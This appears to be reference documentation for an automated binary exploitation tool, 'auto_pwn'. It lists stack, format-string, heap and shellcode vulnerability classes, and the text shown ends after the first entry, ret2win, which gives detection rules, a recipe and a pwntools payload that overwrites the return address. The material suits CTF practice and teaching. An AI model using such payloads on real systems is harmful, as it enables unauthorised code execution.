# Vulnerability Types Reference

Complete catalog of every vulnerability class `auto_pwn` detects, with:

- **Detection logic** — what conditions trigger it
- **Recipe** — the exploitation strategy in plain English
- **Payload skeleton** — copy-paste-ready exploit code
- **Notes** — edge cases, gotchas, related techniques

---

## Table of Contents

- [Stack / Control-Flow](#stack--control-flow)
  - [ret2win](#1-ret2win)
  - [ret2win_canary_fmt](#2-ret2win_canary_fmt)
  - [ret2win_canary_brute](#3-ret2win_canary_brute)
  - [ret2win_pie](#4-ret2win_pie)
  - [ret2libc](#5-ret2libc)
  - [ret2libc_canary_fmt](#6-ret2libc_canary_fmt)
  - [ret2csu](#7-ret2csu)
  - [ret2dlresolve](#8-ret2dlresolve)
  - [ret2plt](#9-ret2plt)
  - [partial_overwrite](#10-partial_overwrite)
  - [SROP](#11-srop)
  - [one_gadget](#12-one_gadget)
- [Format String](#format-string)
  - [fmtstr_got_overwrite](#13-fmtstr_got_overwrite)
  - [fmtstr_arbitrary_write](#14-fmtstr_arbitrary_write)
  - [fmtstr_leak_only](#15-fmtstr_leak_only)
- [Shellcode](#shellcode)
  - [shellcode_stack](#16-shellcode_stack)
  - [mprotect_shellcode](#17-mprotect_shellcode)
- [Heap](#heap)
  - [heap_uaf](#18-heap_uaf)
  - [heap_double_free](#19-heap_double_free)
  - [heap_tcache_poison](#20-heap_tcache_poison)
- [Misc](#misc)
  - [integer_overflow](#21-integer_overflow)
  - [off_by_one](#22-off_by_one)
  - [oob_array](#23-oob_array)
  - [command_injection](#24-command_injection)
  - [race_condition](#25-race_condition)

---

## Stack / Control-Flow

### 1. `ret2win`

**Detection:**
- win-like symbol present (`win`, `flag`, `shell`, `secret`, `backdoor`, `admin`)
- **no** stack canary
- **no** PIE
- overflow-prone input imported (`gets`, `read`, `fgets`, `scanf`, ...)

**Confidence:** HIGH if overflow input detected, MEDIUM otherwise.

**Why it works:** Without PIE, the win address is static. Without a canary, the return address can be freely overwritten.

**Recipe:**
1. Find offset: `cyclic(200)` → crash → `cyclic_find(rip)`
2. Send `b"A" * offset + p64(WIN)`
3. Optionally add a `ret` gadget for stack alignment

**Payload:**
```python
OFFSET = 40
payload  = b"A" * OFFSET
payload += p64(RET)        # optional alignment
payload += p64(WIN)
io.sendline(payload)
